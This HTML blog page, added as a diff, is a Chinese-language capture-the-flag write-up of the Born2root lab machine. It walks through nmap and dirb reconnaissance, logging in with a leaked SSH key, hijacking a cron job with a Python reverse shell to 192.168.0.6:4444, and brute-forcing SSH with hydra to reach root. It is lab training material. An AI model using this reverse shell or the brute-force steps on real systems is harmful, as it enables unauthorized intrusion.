@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CTF-Born2root&#39;s-WriteUP，通过定时任务反弹shell再到Hadry暴力枚举SSH拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-Born2root&#39;s-WriteUP，通过定时任务反弹shell再到Hadry暴力枚举SSH拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 16, 2019&nbsp;&nbsp;18:16:57</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1399335349&auto=1&height=66"></iframe>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/774.png" alt="图片"></p>
+<p>HackGameName：Born2root’s<br>Level：Medium<br>Task：Get <code>/root/flag.txt</code></p>
+<h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>利用<code>Linux</code>的<code>/etc/crontab</code>文件获取<code>Shell</code><br>利用<code>Hadry</code>暴力枚举<code>SSH</code>登陆密码</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>先是扫描一下 <code>eth0</code> 网卡下有哪些主机存活（wifi连接的网卡）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/775.png" alt="图片"></p>
+<p>扫描出来后，发现靶机 IP ：<code>192.168.0.49</code>，获取到 <code>IP</code> 之后对它进行 <code>NMAP</code> 端口扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.0.49</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/776.png" alt="图片"></p>
+<p>扫描出来它开放了三个端口：<code>22</code>，<code>80</code>，<code>111</code>，操作系统是<code>Linux</code>，内核版本是<code>3.2-4.9</code>（模糊）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)</span><br><span class="line">|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)</span><br><span class="line">|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)</span><br><span class="line">|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:<span class="built_in">cd</span>:df:13:76:32:4e (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress-blog /files</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title:  Secretsec Company </span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          46136/udp6  status</span><br><span class="line">|   100024  1          47014/udp   status</span><br><span class="line">|   100024  1          53732/tcp6  status</span><br><span class="line">|_  100024  1          56378/tcp   status</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/777.png" alt="图片"></p>
+<p>通过扫描出来的开放服务，我对它进行来搜索，看看有没有对应的漏洞，很显然通过上图来看它们是没有漏洞的！那么我们继续从<code>web</code>开始！</p>
+<p>使用 <code>dirb</code> 对web目录进行探测枚举：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.0.49/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/778.png" alt="图片"></p>
+<p>访问 <code>files</code> 是一个目录遍历，但是里面是空的；接着访问了 <code>http://192.168.0.49/icons/</code> 发现也是一个<code>目录遍历</code>，里面泄漏了很多文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/779.png" alt="图片"></p>
+<p>其中有一个文件 <code>VDSoyuAXiO.txt</code> 打开后发现是一个 <code>ssh</code> 的密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.49/icons/VDSoyuAXiO.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/780.png" alt="图片"></p>
+<p>这个很显然是一个 <code>ssh-keygen</code> 生成的<code>私钥</code>文件！原文件名应该是：<code>id_rsa</code>，通过这个文件我们可以对它进行破解，我们先保存起！继续信息搜集！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/781.png" alt="图片"></p>
+<p>通过访问 <code>robots.txt</code> 后我发现它有两个文件，但是打开后发现没啥用：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/782.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/783.png" alt="图片"></p>
+<p>最后通过访问 <code>index.html</code> 发现它泄漏了一个手机号和三个用户以及一枚邮箱：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tel：052-452-990-054</span><br><span class="line">user：Martin、Hadi、Jimmy</span><br><span class="line">email：martin@sercetsec.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/784.png" alt="图片"></p>
+<p>通过信息搜集后，我从<code>web</code>得到了一些用户名、邮箱，最重要的是我还得到了一个 <code>ssh</code> 的私钥！</p>
+<h2 id="登陆SSH"><a href="#登陆SSH" class="headerlink" title="登陆SSH"></a>登陆SSH</h2><p>通过刚刚的信息搜集我利用 <code>wget</code> 把文件<code>VDSoyuAXiO.txt</code>下载到本地并重命名为 <code>id_rsa</code> 文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/785.png" alt="图片"></p>
+<p>因为刚刚得到了几个用户，通过社工到手段再结合利用这个私钥我尝试 <code>ssh</code>登陆三个用户，最终是登陆了 <code>martn</code> 用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa martin@192.168.0.49</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/786.png" alt="图片"></p>
+<p>登陆到 <code>martin</code> 用户后，我通过查看 <code>passwd</code> 文件发现了三个用户，那三个用户正是刚刚信息搜集得到到用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hadi  </span><br><span class="line">jimmy  </span><br><span class="line">martin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/787.png" alt="图片"></p>
+<p>接着我来到 <code>home</code> 目录下的 <code>hadi</code> 用户，我发现里面没有啥文件可以利用的：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/788.png" alt="图片"></p>
+<p>接着尝试进入 <code>jimmy</code> 用户目录发现权限不够，进入不了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/789.png" alt="图片"></p>
+<h2 id="利用定时任务反弹Shell"><a href="#利用定时任务反弹Shell" class="headerlink" title="利用定时任务反弹Shell"></a>利用定时任务反弹Shell</h2><p>通过查看 <code>/etc/crontab</code> 目录，我发现了一个<code>定时任务</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/790.png" alt="图片"></p>
+<p>在 <code>/tmp</code>（临时目录）下有一个 <code>sekurity.py</code> 文件，<code>jimmy</code> 用户会每隔五分钟运行一次！那么，我们可不可以通过这个来反弹<code>Shell</code>呢？</p>
+<p>通过进入 <code>tmp</code> 目录发现里面是空的，啥文件都没有：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/791.png" alt="图片"></p>
+<p>然后创建一个 <code>sekurity.py</code> 文件，里面内容是通过 socket、subprocess、os模块，通过套接字监听 <code>kali</code> 的 <code>ip</code>和<code>端口</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/792.png" alt="图片"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.0.6&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>); </span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>Kali</code> 使用 <code>nc</code> 监听 <code>4444</code> 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>过了五分钟后，通过nc得到了一枚shell：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/793.png" alt="图片"></p>
+<p>通过信息收集发现 <code>jimmy</code> 用户没得 <code>flag</code> 文件，那么估计就在 <code>hadi</code> 用户哪里！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/794.png" alt="图片"></p>
+<p>这个时候我通过一系列的翻文件和一些关键信息，我没有找到可以利用的地方，没办法只能通过最暴力的办法获取<code>hadi</code>用户：<code>暴力枚举</code>！</p>
+<h2 id="Hadry爆破SSH"><a href="#Hadry爆破SSH" class="headerlink" title="Hadry爆破SSH"></a>Hadry爆破SSH</h2><p>通过字典生成，我生成了有关 <code>hadi</code> 的字典文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/795.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/796.png" alt="图片"></p>
+<p>利用<code>Hadry</code>爆破<code>SSH</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l hadi -P dic.txt 192.168.0.49 ssh  -v </span><br><span class="line">其中-l 指定用户名，可以使用-L指定用户名字典文件；-p指定密码，-P指定密码字典文件;-v显示详细的执行过程；-f爆破成功后就停止枚举。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/797.png" alt="图片"></p>
+<p>通过暴力枚举后，得到 <code>hadi</code> 的密码是 <code>hadi123</code>！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/798.png" alt="图片"></p>
+<p>通过登陆到 <code>hadi</code> 用户后，<code>su</code> 切换 <code>root</code> 用户，密码为 <code>hadi123</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/799.png" alt="图片"></p>
+<p>最终在 <code>root</code> 目录下得到了 <code>flag</code> ！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/16/CTF-Born2Root/">http://example.com/2019/12/16/CTF-Born2Root/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/22/CTF-Lazysysadmin/">CTF-Lazysysadmin-WriteUP，通过SMB空密码泄露铭感文件再到Wordpress获取Shell拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/09/HackTheBox-Chaos/">HackTheBox-Chaos-CTF_解题过程</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
